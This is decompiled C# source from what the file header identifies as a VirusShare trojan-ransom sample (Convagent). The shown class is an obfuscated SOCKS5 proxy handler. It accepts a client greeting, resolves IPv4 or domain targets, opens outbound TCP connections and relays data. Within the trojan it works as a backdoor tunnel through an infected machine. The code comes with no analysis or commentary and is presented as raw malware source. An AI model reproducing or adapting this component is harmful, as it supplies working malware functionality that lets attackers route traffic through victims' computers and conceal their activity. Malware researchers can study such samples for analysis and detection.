// Decompiled with JetBrains decompiler
// Type: *p.A
._".F$%
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0001_\u008D\u0022
{
  internal class F\u0024\u000B\u0025
  {
    private Socket a\u0003\u0017\u003A;
    private Socket \u0036\u00167sE\u0005;
    private byte[] \u003A\u007BA\u000D = new byte[1024];
    private int U0\u001C;

    public F\u0024\u000B\u0025(Socket _param1) => this.a\u0003\u0017\u003A = _param1;

    public void \u000F\u0002() => this.a\u0003\u0017\u003A.BeginReceive(this.\u003A\u007BA\u000D, 0, this.\u003A\u007BA\u000D.Length, SocketFlags.None, new AsyncCallback(this.\u001Bg\u002D), (object) this.a\u0003\u0017\u003A);

    private void \u001Bg\u002D(IAsyncResult _param1)
    {
      try
      {
        int num = ((Socket) _param1.AsyncState).EndReceive(_param1);
        if (num > 0)
        {
          this.\u0034r\u0029(this.\u003A\u007BA\u000D, num);
          ((Socket) _param1.AsyncState).BeginReceive(this.\u003A\u007BA\u000D, 0, this.\u003A\u007BA\u000D.Length, SocketFlags.None, new AsyncCallback(this.\u001Bg\u002D), (object) (Socket) _param1.AsyncState);
        }
        else
          this.\u007B7\u002F\u0006\u0003\u005D\u0029();
      }
      catch
      {
      }
    }

    private void _S\u005B(IAsyncResult _param1)
    {
      try
      {
        int size = ((Socket) _param1.AsyncState).EndReceive(_param1);
        if (size > 0)
        {
          this.a\u0003\u0017\u003A.BeginSend(this.\u003A\u007BA\u000D, 0, size, SocketFlags.None, new AsyncCallback(this.\u0029k0), (object) this.a\u0003\u0017\u003A);
          ((Socket) _param1.AsyncState).BeginReceive(this.\u003A\u007BA\u000D, 0, this.\u003A\u007BA\u000D.Length, SocketFlags.None, new AsyncCallback(this._S\u005B), (object) (Socket) _param1.AsyncState);
        }
        else
          this.\u007B7\u002F\u0006\u0003\u005D\u0029();
      }
      catch
      {
      }
    }

    private void \u000F\u000C(IAsyncResult _param1)
    {
      try
      {
        ((Socket) _param1.AsyncState).EndConnect(_param1);
        ((Socket) _param1.AsyncState).BeginReceive(this.\u003A\u007BA\u000D, 0, this.\u003A\u007BA\u000D.Length, SocketFlags.None, new AsyncCallback(this._S\u005B), (object) (Socket) _param1.AsyncState);
      }
      catch
      {
      }
    }

    private void \u0029k0(IAsyncResult _param1)
    {
      try
      {
        ((Socket) _param1.AsyncState).EndSend(_param1);
      }
      catch
      {
      }
    }

    private void \u0034r\u0029(byte[] _param1, int _param2)
    {
      switch (this.U0\u001C)
      {
        case 0:
          byte num = _param1[0];
          byte maxValue = _param1[2];
          if (num != (byte) 5)
          {
            this.\u007B7\u002F\u0006\u0003\u005D\u0029();
            break;
          }
          if (maxValue != (byte) 0)
            maxValue = byte.MaxValue;
          this.a\u0003\u0017\u003A.BeginSend(new byte[2]
          {
            num,
            maxValue
          }, 0, 2, SocketFlags.None, new AsyncCallback(this.\u0029k0), (object) this.a\u0003\u0017\u003A);
          ++this.U0\u001C;
          break;
        case 1:
          IPAddress address = (IPAddress) null;
          ushort port = 0;
          if (this.\u003A\u007BA\u000D[1] == (byte) 1)
          {
            switch (this.\u003A\u007BA\u000D[3])
            {
              case 1:
                address = IPAddress.Parse(_param1[4].ToString() + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.eY() + _param1[5].ToString() + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.eY() + _param1[6].ToString() + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.eY() + _param1[7].ToString());
                port = (ushort) ((uint) _param1[8] * 256U + (uint) _param1[9]);
                break;
              case 3:
                address = Dns.GetHostAddresses(Encoding.Default.GetString(_param1, 5, (int) _param1[4]))[0];
                ushort index = (ushort) ((uint) _param1[4] + 5U);
                port = (ushort) ((uint) _param1[(int) index] * 256U + (uint) _param1[(int) index + 1]);
                break;
            }
          }
          this.\u0036\u00167sE\u0005 = new Socket(address.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
          this.\u0036\u00167sE\u0005.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
          this.\u0036\u00167sE\u0005.BeginConnect((EndPoint) new IPEndPoint(address, (int) port), new AsyncCallback(this.\u000F\u000C), (object) this.\u0036\u00167sE\u0005).AsyncWaitHandle.WaitOne();
          _param1[1] = !this.\u0036\u00167sE\u0005.Connected ? (byte) 4 : (byte) 0;
          this.a\u0003\u0017\u003A.BeginSend(_param1, 0, _param2, SocketFlags.None, new AsyncCallback(this.\u0029k0), (object) this.a\u0003\u0017\u003A);
          ++this.U0\u001C;
          break;
        case 2:
          this.\u0036\u00167sE\u0005.BeginSend(_param1, 0, _param2, SocketFlags.None, new AsyncCallback(this.\u0029k0), (object) this.\u0036\u00167sE\u0005);
          break;
      }
    }

    private void \u007B7\u002F\u0006\u0003\u005D\u0029()
    {
      try
      {
        this.\u0036\u00167sE\u0005.Disconnect(false);
        this.a\u0003\u0017\u003A.Disconnect(false);
        this.\u0036\u00167sE\u0005.Close();
        this.a\u0003\u0017\u003A.Close();
      }
      catch
      {
      }
    }
  }
}
